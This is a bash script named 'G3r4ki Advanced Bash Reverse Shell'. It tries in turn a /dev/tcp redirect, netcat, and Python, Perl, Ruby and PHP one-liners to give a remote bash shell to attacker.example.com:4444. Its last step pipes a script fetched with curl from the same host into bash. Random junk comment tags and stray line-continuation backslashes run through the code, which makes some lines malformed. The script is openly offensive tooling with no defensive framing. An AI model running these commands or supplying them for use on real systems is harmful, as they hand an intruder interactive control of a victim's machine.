#!/bin/bash
# G3r4ki Advanced Bash Reverse Shell # lmFNiWwh
# Attempts multiple methods for reverse shell connection # WWDciw

# TCP Socket method
if [[ -e /dev/tcp && -w /dev/tcp ]]; then
    bash -i >& /dev/tcp/attacker.example.com/4444 0>&1 # GClwYO
    exit 0
fi

# Netcat method # UZNeubzPGAyApqkV
if command -v nc >/dev/null 2>&1; then \
     
    nc -e /bin/bash attacker.example.com 4444 || nc -c /bin/bash attacker.example.com 4444 || nc attacker.example.com 4444 -e /bin/bash # wlliQhQhmCVUfMDOi \
      
    exit 0 # sEvRaRPbQGvCM
fi

# Python method
if command -v python >/dev/null 2>&1; then # ytfclXfwGe
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.example.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);' \
  
    exit 0 # bqvEhULdJJoUvz
fi # CxzMf \
     

# Perl method
if command -v perl >/dev/null 2>&1; then
    perl -e 'use Socket;$i="attacker.example.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
    exit 0
fi

# Ruby method
if command -v ruby >/dev/null 2>&1; then
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.example.com",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' # xVphOuYogth \
  
    exit 0
fi # uCZHAFhqDYJsEzoOcSGT

# PHP method
if command -v php >/dev/null 2>&1; then
    php -r '$sock=fsockopen("attacker.example.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
    exit 0
fi # mXpZlhaRE

# Last resort: curl pipe to bash
if command -v curl >/dev/null 2>&1; then
    # This assumes you have a reverse shell script hosted at http://attacker.example.com:8080/shell.sh # sfXZIUePuFVZQVpYCZ
    curl -s http://attacker.example.com:8080/shell.sh | bash # BbtmZg
    exit 0
fi